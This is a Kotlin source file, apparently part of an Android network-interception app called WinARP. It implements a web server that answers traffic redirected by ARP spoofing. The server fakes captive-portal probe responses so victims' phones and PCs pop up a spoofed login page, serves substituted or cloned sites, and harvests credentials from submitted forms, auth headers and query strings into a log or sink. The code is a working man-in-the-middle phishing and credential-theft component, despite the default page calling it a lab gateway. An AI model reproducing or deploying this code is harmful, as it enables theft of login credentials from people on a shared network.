package com.winarp.mobile.net

import com.winarp.mobile.data.SpoofConfig
import com.winarp.mobile.data.SpoofMode
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.io.OutputStream
import java.net.InetSocketAddress
import java.net.ServerSocket
import java.net.Socket
import java.util.Locale
import java.util.concurrent.atomic.AtomicInteger

/**
 * A small, configurable HTTP server used for page substitution / captive-portal on intercepted
 * (REDIRECTed) forwarded traffic. Pure Kotlin — root only installs the iptables REDIRECT; the
 * forwarded packet is delivered locally to this listener.
 *
 * Extensible by design: [SpoofMode.STATIC_SITE] serves a whole document root, so you can drop an
 * imported HTML folder or a built Vite/React `dist/` into [docRoot] and it just serves it (with
 * SPA fallback). Captive-portal probe endpoints for Apple/Android/Windows are answered so the
 * victim's OS pops its portal UI even without touching the client.
 */
class WebServer {

    private val _running = MutableStateFlow(false)
    val running: StateFlow<Boolean> = _running.asStateFlow()

    private val _requests = MutableStateFlow(0)
    val requests: StateFlow<Int> = _requests.asStateFlow()

    private val _log = MutableStateFlow<List<String>>(emptyList())
    val log: StateFlow<List<String>> = _log.asStateFlow()

    private var serverSocket: ServerSocket? = null
    private var scope: CoroutineScope? = null
    private val count = AtomicInteger(0)

    @Volatile private var cfg = SpoofConfig()
    @Volatile private var docRoot: File? = null
    @Volatile private var singleHtml: File? = null
    @Volatile private var onCred: (String) -> Unit = { addLog(it) }

    /** Route harvested credentials somewhere visible (defaults to this server's own log). */
    fun setCredSink(sink: (String) -> Unit) { onCred = sink }

    private val probeHosts = listOf(
        "captive.apple.com", "connectivitycheck.gstatic.com", "connectivitycheck.android.com",
        "clients3.google.com", "www.msftconnecttest.com", "msftconnecttest.com", "www.msftncsi.com"
    )
    private val probePaths = listOf("/generate_204", "/hotspot-detect.html", "/connecttest.txt", "/ncsi.txt", "/success.txt")

    fun start(config: SpoofConfig, docRootDir: File, singleHtmlFile: File): String? {
        stop()
        cfg = config
        docRoot = docRootDir
        singleHtml = singleHtmlFile
        return try {
            val ss = ServerSocket()
            ss.reuseAddress = true
            ss.bind(InetSocketAddress(config.port))
            serverSocket = ss
            val sc = CoroutineScope(SupervisorJob() + Dispatchers.IO)
            scope = sc
            _running.value = true
            addLog("[*] web server on :${config.port} mode=${config.mode}")
            sc.launch {
                while (true) {
                    val client = try {
                        ss.accept()
                    } catch (_: Throwable) {
                        break
                    }
                    launch { serve(client) }
                }
            }
            null
        } catch (t: Throwable) {
            _running.value = false
            t.message ?: "web server failed to start"
        }
    }

    fun stop() {
        try { serverSocket?.close() } catch (_: Throwable) {}
        serverSocket = null
        try { scope?.cancel() } catch (_: Throwable) {}
        scope = null
        _running.value = false
    }

    private fun serve(socket: Socket) {
        socket.use { s ->
            try {
                val reader = BufferedReader(InputStreamReader(s.getInputStream()))
                val requestLine = reader.readLine() ?: return
                val parts = requestLine.split(" ")
                if (parts.size < 2) return
                val method = parts[0].uppercase(Locale.US)
                val rawPath = parts[1]
                var host = ""
                var contentLength = 0
                val headerLines = ArrayList<String>()
                while (true) {
                    val h = reader.readLine() ?: break
                    if (h.isEmpty()) break
                    headerLines += h
                    if (h.startsWith("Host:", ignoreCase = true)) {
                        host = h.substringAfter(":").trim().substringBefore(":").lowercase(Locale.US)
                    }
                    if (h.startsWith("Content-Length:", ignoreCase = true)) {
                        contentLength = h.substringAfter(":").trim().toIntOrNull() ?: 0
                    }
                }
                // read the POST body (a submitted login form lands here on a captive/spoof page)
                var body = ""
                if (contentLength in 1..65536) {
                    val cbuf = CharArray(contentLength)
                    var read = 0
                    while (read < contentLength) {
                        val r = reader.read(cbuf, read, contentLength - read)
                        if (r < 0) break
                        read += r
                    }
                    body = String(cbuf, 0, read)
                }
                harvest(host.ifBlank { "spoof" }, rawPath, headerLines, body)
                val path = rawPath.substringBefore('?')
                route(s.getOutputStream(), method, host, path)
            } catch (_: Throwable) {
                // drop
            }
        }
    }

    /** Pull credentials out of a submitted form / auth header on our page and report them. */
    private fun harvest(host: String, rawPath: String, headerLines: List<String>, body: String) {
        try {
            val ct = headerLines.firstOrNull { it.startsWith("content-type:", true) }
                ?.substringAfter(':')?.trim() ?: ""
            val found = ArrayList<String>()
            found += CredSniffer.scanHeaders(host, headerLines)
            val query = rawPath.substringAfter('?', "")
            if (query.isNotBlank()) found += CredSniffer.scanBody(host, "", query)
            found += CredSniffer.scanBody(host, ct, body)
            found.forEach { onCred(it) }
        } catch (_: Throwable) {
        }
    }

    private fun route(out: OutputStream, method: String, host: String, path: String) {
        _requests.value = count.incrementAndGet()
        val c = cfg

        // captive-portal probes: answer non-expected so the OS pops its portal
        if (c.assistCaptivePortal && isProbe(host, path)) {
            addLog("portal $host$path")
            serveSpoof(out, method)
            return
        }

        // target filter: if a host list is set and this host isn't in it, let it go real (302 to https)
        val targets = c.targetHosts.split(',', ' ', '\n', '\t', ';').map { it.trim().lowercase(Locale.US) }.filter { it.isNotEmpty() }
        if (targets.isNotEmpty() && host.isNotEmpty() && targets.none { host == it || host.endsWith(".$it") }) {
            addLog("pass  $host$path")
            writeResponse(out, 302, "text/plain", ByteArray(0), method, extra = "Location: https://$host$path\r\n")
            return
        }

        addLog("serve $host$path")
        when (c.mode) {
            SpoofMode.REDIRECT -> {
                if (c.redirectUrl.isNotBlank()) {
                    writeResponse(out, 302, "text/plain", ByteArray(0), method, extra = "Location: ${c.redirectUrl}\r\n")
                } else {
                    serveSpoof(out, method)
                }
            }
            SpoofMode.SINGLE_PAGE -> serveSpoof(out, method)
            SpoofMode.STATIC_SITE -> serveStatic(out, method, path)
        }
    }

    private fun serveSpoof(out: OutputStream, method: String) {
        val body = singleHtml?.takeIf { it.exists() }?.readBytes() ?: DEFAULT_PAGE.toByteArray()
        writeResponse(out, 200, "text/html; charset=utf-8", body, method)
    }

    private fun serveStatic(out: OutputStream, method: String, path: String) {
        val root = docRoot
        if (root == null || !root.isDirectory) { serveSpoof(out, method); return }
        val rel = path.trimStart('/').ifEmpty { "index.html" }
        var f = File(root, rel)
        // block path traversal outside the docRoot
        if (!f.canonicalPath.startsWith(root.canonicalPath)) {
            writeResponse(out, 403, "text/plain", "forbidden".toByteArray(), method)
            return
        }
        if (f.isDirectory) f = File(f, "index.html")
        if (!f.exists()) {
            if (cfg.spaFallback) {
                val idx = File(root, "index.html")
                if (idx.exists()) { writeResponse(out, 200, "text/html; charset=utf-8", idx.readBytes(), method); return }
            }
            writeResponse(out, 404, "text/plain", "not found".toByteArray(), method)
            return
        }
        writeResponse(out, 200, mimeOf(f.name), f.readBytes(), method)
    }

    private fun writeResponse(out: OutputStream, status: Int, contentType: String, body: ByteArray, method: String, extra: String = "") {
        val reason = when (status) {
            200 -> "OK"; 302 -> "Found"; 403 -> "Forbidden"; 404 -> "Not Found"; else -> "OK"
        }
        val head = StringBuilder()
        head.append("HTTP/1.1 $status $reason\r\n")
        head.append("Content-Type: $contentType\r\n")
        head.append("Content-Length: ${body.size}\r\n")
        head.append("Connection: close\r\n")
        head.append("Cache-Control: no-store\r\n")
        head.append(extra)
        head.append("\r\n")
        try {
            out.write(head.toString().toByteArray())
            if (method != "HEAD") out.write(body)
            out.flush()
        } catch (_: Throwable) {
        }
    }

    private fun isProbe(host: String, path: String): Boolean =
        probeHosts.any { host == it || host.endsWith(".$it") } || probePaths.any { path.equals(it, ignoreCase = true) }

    private fun mimeOf(name: String): String = when (name.substringAfterLast('.', "").lowercase(Locale.US)) {
        "html", "htm" -> "text/html; charset=utf-8"
        "js", "mjs" -> "application/javascript"
        "css" -> "text/css"
        "json" -> "application/json"
        "png" -> "image/png"
        "jpg", "jpeg" -> "image/jpeg"
        "gif" -> "image/gif"
        "svg" -> "image/svg+xml"
        "webp" -> "image/webp"
        "ico" -> "image/x-icon"
        "woff" -> "font/woff"
        "woff2" -> "font/woff2"
        "wasm" -> "application/wasm"
        "txt" -> "text/plain; charset=utf-8"
        else -> "application/octet-stream"
    }

    private fun addLog(line: String) {
        _log.value = (_log.value + line).let { if (it.size > 200) it.takeLast(200) else it }
    }

    companion object {
        const val DEFAULT_PAGE = """<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WinARP</title></head>
<body style="font-family:system-ui;background:#0b1220;color:#e8eef9;display:flex;min-height:100vh;align-items:center;justify-content:center;margin:0">
<div style="text-align:center;padding:24px">
<h1 style="color:#5b8cff">Intercepted</h1>
<p>This page is served by the WinARP lab gateway.</p>
<p style="color:#9aabc8">Edit it, or switch to Static Site mode to serve a whole folder / Vite build.</p>
</div></body></html>"""
    }
}
